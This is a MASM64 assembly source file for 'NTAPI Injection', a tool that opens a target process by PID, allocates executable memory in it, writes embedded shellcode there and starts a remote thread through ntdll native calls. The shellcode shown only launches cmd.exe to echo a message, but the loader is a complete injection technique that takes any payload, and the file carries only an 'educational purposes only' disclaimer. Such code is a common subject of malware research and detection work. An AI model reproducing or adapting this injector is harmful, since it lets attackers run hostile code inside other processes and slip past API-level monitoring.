; /*
;
; @author: 0xbekoo
; @Project: NTAPI Injection with MASM64 Assembly
; @Last Update: 2024-12-18
;
; @Warning: This project is for educational purposes only. If you use this project for illegal purposes, it is your responsibility.
;
; */

include utils.inc

.const 
    ; Make sure you enter the PID
    PID DWORD 0

    ALL_ACCESS equ 1FFFFFh
    PAGE_EXECUTE_READWRITE equ 40h
    MEM_COMMIT_RESERVE equ 3000h
    PAGE_EXECUTE_READ equ 20h

.data
    OldProtect dd 0
    ShellcodeSize QWORD 0

.code
     ; /*
     ;  cmd /K "echo NTAPI Injection with masm64"
     ; */
     Shellcode BYTE 0fch, 048h, 083h, 0e4h, 0f0h, 0e8h, 0c0h, 000h, 000h, 000h, 041h, 051h, 041h, 050h, 052h
               BYTE 051h, 056h, 048h, 031h, 0d2h, 065h, 048h, 08bh, 052h, 060h, 048h, 08bh, 052h, 018h, 048h
               BYTE 08bh, 052h, 020h, 048h, 08bh, 072h, 050h, 048h, 00fh, 0b7h, 04ah, 04ah, 04dh, 031h, 0c9h
               BYTE 048h, 031h, 0c0h, 0ach, 03ch, 061h, 07ch, 002h, 02ch, 020h, 041h, 0c1h, 0c9h, 00dh, 041h
               BYTE 001h, 0c1h, 0e2h, 0edh, 052h, 041h, 051h, 048h, 08bh, 052h, 020h, 08bh, 042h, 03ch, 048h
               BYTE 001h, 0d0h, 08bh, 080h, 088h, 000h, 000h, 000h, 048h, 085h, 0c0h, 074h, 067h, 048h, 001h
               BYTE 0d0h, 050h, 08bh, 048h, 018h, 044h, 08bh, 040h, 020h, 049h, 001h, 0d0h, 0e3h, 056h, 048h
               BYTE 0ffh, 0c9h, 041h, 08bh, 034h, 088h, 048h, 001h, 0d6h, 04dh, 031h, 0c9h, 048h, 031h, 0c0h
               BYTE 0ach, 041h, 0c1h, 0c9h, 00dh, 041h, 001h, 0c1h, 038h, 0e0h, 075h, 0f1h, 04ch, 003h, 04ch
               BYTE 024h, 008h, 045h, 039h, 0d1h, 075h, 0d8h, 058h, 044h, 08bh, 040h, 024h, 049h, 001h, 0d0h
               BYTE 066h, 041h, 08bh, 00ch, 048h, 044h, 08bh, 040h, 01ch, 049h, 001h, 0d0h, 041h, 08bh, 004h
               BYTE 088h, 048h, 001h, 0d0h, 041h, 058h, 041h, 058h, 05eh, 059h, 05ah, 041h, 058h, 041h, 059h
               BYTE 041h, 05ah, 048h, 083h, 0ech, 020h, 041h, 052h, 0ffh, 0e0h, 058h, 041h, 059h, 05ah, 048h
               BYTE 08bh, 012h, 0e9h, 057h, 0ffh, 0ffh, 0ffh, 05dh, 048h, 0bah, 001h, 000h, 000h, 000h, 000h
               BYTE 000h, 000h, 000h, 048h, 08dh, 08dh, 001h, 001h, 000h, 000h, 041h, 0bah, 031h, 08bh, 06fh
               BYTE 087h, 0ffh, 0d5h, 0bbh, 0f0h, 0b5h, 0a2h, 056h, 041h, 0bah, 0a6h, 095h, 0bdh, 09dh, 0ffh
               BYTE 0d5h, 048h, 083h, 0c4h, 028h, 03ch, 006h, 07ch, 00ah, 080h, 0fbh, 0e0h, 075h, 005h, 0bbh
               BYTE 047h, 013h, 072h, 06fh, 06ah, 000h, 059h, 041h, 089h, 0dah, 0ffh, 0d5h, 063h, 06dh, 064h
               BYTE 02eh, 065h, 078h, 065h, 020h, 02fh, 04bh, 020h, 022h, 065h, 063h, 068h, 06fh, 020h, 04eh
               BYTE 054h, 041h, 050h, 049h, 020h, 049h, 06eh, 06ah, 065h, 063h, 074h, 069h, 06fh, 06eh, 020h
               BYTE 077h, 069h, 074h, 068h, 020h, 06dh, 061h, 073h, 06dh, 036h, 034h, 000h

mainCRTStartup PROC
    mov ecx,dword ptr [PID]
    cmp ecx,0
    jz Exit

    call PrepareStructures

    ; Get NTDLL Address
    sub rsp,38h
    lea rcx,[NTDLLString]
    call GetModuleHandleA
    add rsp,38h

    lea rdx,[NTDLLAddress]
    mov rcx,rax
    call CheckFunctionResult

    ; Get the Address of NtOpenProcess
    lea rdx,[NtOpenProcessString]
    mov rcx,NTDLLAddress
    call GetSpecificFunction

    xor rdx,rdx
    mov rcx,rax
    call CheckFunctionResult
    
    ; Call NtOpenProcess
    sub rsp,38h
    lea r9,CID
    lea r8,ObjAttr
    mov edx,ALL_ACCESS
    lea rcx,HandleProcess
    call rax
    add rsp,38h

    cmp rax,0
    jnz Exit 

    ; Get the Address of NtAllocateVirtualMemory
    lea rdx,[NtAllocateVirtualString]
    mov rcx,NTDLLAddress
    call GetSpecificFunction

    xor rdx,rdx
    mov rcx,rax
    call CheckFunctionResult

    ; Call NtAllocateVirtualMemory
    mov rcx,sizeof Shellcode
    mov ShellcodeSize,rcx

    sub rsp,38h
    mov dword ptr [rsp+28h],PAGE_EXECUTE_READWRITE
    mov dword ptr [rsp+20h],MEM_COMMIT_RESERVE
    lea r9,ShellcodeSize
    xor r8d,r8d
    lea rdx,RemoteBuffer
    mov rcx,HandleProcess
    call rax
    add rsp,38h

    cmp rax,0
    jnz Exit

    ; Get the Address of NtWriteVirtualMemory
    lea rdx,[NtWriteVirtualString]
    mov rcx,NTDLLAddress
    call GetSpecificFunction

    xor rdx,rdx
    mov rcx,rax
    call CheckFunctionResult

    ; Call NtWriteVirtualMemory
    sub rsp,38h
    mov qword ptr [rsp + 20h],0
    mov r9,ShellcodeSize
    lea r8,Shellcode
    mov rdx,RemoteBuffer
    mov rcx,HandleProcess
    call rax
    add rsp,38h

    cmp rax,0
    jnz Exit

    ; Get the Address of NtProtectVirtualMemory
    lea rdx,[NtProtectVirtualString]
    mov rcx,NTDLLAddress
    call GetSpecificFunction

    xor rdx,rdx
    mov rcx,rax
    call CheckFunctionResult

    ; Call NtProtectVirtualMemory
    sub rsp,38h
    lea rcx,OldProtect
    mov qword ptr [rsp + 20h],rcx
    mov r9d,PAGE_EXECUTE_READ
    lea r8,ShellcodeSize
    lea rdx,[RemoteBuffer]
    mov rcx,HandleProcess
    call rax
    add rsp,38h

    cmp rax,0
    jnz Exit

    ; Get the Address of NtCreateThreadEx
    lea rdx,[NtCreateThreadString]
    mov rcx,NTDLLAddress
    call GetSpecificFunction

    xor rdx,rdx
    mov rcx,rax
    call CheckFunctionResult

    ; Call NtCreateThreadEx
    mov r10,RemoteBuffer

    sub rsp,38h
    mov qword ptr [rsp + 50h],0
    mov qword ptr [rsp + 48h],0
    mov qword ptr [rsp + 40h],0
    mov qword ptr [rsp + 38h],0
    mov qword ptr [rsp + 30h],0
    mov qword ptr [rsp + 28h],0
    mov qword ptr [rsp + 20h],r10
    mov r9,HandleProcess
    lea r8,ObjAttr
    mov edx,ALL_ACCESS
    lea rcx,HandleThread
    call rax
    add rsp,38h

    cmp rax,0
    jnz Exit

    ; Get the Address of NtWaitForSingleObject
    lea rdx,[NtWaitString]
    mov rcx,NTDLLAddress
    call GetSpecificFunction

    xor rdx,rdx
    mov rcx,rax
    call CheckFunctionResult

    ; Call NtWaitForSingleObject
    sub rsp,38h
    mov r8,0
    xor rdx,rdx
    mov rcx,HandleThread
    call rax
    add rsp,38h

Exit:
    mov rdx,HandleProcess
    mov rcx,HandleThread
    jmp ExitProgram
mainCRTStartup ENDP


PrepareStructures PROC
    mov CID.UniqueProcess,ecx  
    mov CID.UniqueThread,0 
   
    mov ObjAttr.oLength,0    
    mov ObjAttr.RootDirectory,0    
    mov ObjAttr.ObjectName,0    
    mov ObjAttr.Attributes,0    
    mov ObjAttr.SecurityDescriptor,0    
    mov ObjAttr.SecurityQualityOfService,0    
    mov ObjAttr.oLength,sizeof OBJECT_ATTRIBUTES 

    ret
PrepareStructures ENDP
END
